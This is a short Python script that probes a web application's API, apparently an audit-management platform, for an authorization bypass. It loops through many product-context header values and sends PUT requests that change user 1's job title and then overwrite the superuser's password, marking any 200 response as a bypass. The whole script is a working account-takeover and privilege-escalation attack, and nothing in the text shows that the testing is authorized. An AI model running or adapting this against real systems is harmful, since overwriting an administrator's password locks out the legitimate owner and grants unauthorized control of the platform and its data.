import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None,hdr=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if hdr:
        for k,v in hdr.items(): cmd+=['-H',f'{k}: {v}']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
# Superuser 1 is blocked under X-Auditboard-Product: System. Try other product contexts.
products=['System','SOX','OpsAudit','RegComply','ESG','TPRM','Narratives','WorkStream','Issues','Timesheets','Admin','Core','']
print("=== PUT /users/1 (Superuser) with job_title under different product headers ===")
for p in products:
    h={'X-Auditboard-Product':p} if p else {}
    c,b=req('PUT','/api/v1/users/1',{"user":{"job_title":"zx-probe"}},hdr=h)
    mark='  <<<< BYPASS' if c=='200' else ''
    print(f"  product={p or '(none)':12} -> {c} {b[:90].replace(chr(10),' ')}{mark}")
print("\n=== same with password write ===")
for p in products:
    h={'X-Auditboard-Product':p} if p else {}
    c,b=req('PUT','/api/v1/users/1',{"user":{"password":"Zx9!hdrprobe"}},hdr=h)
    mark='  <<<< BYPASS' if c=='200' else ''
    print(f"  product={p or '(none)':12} -> {c} {b[:90].replace(chr(10),' ')}{mark}")
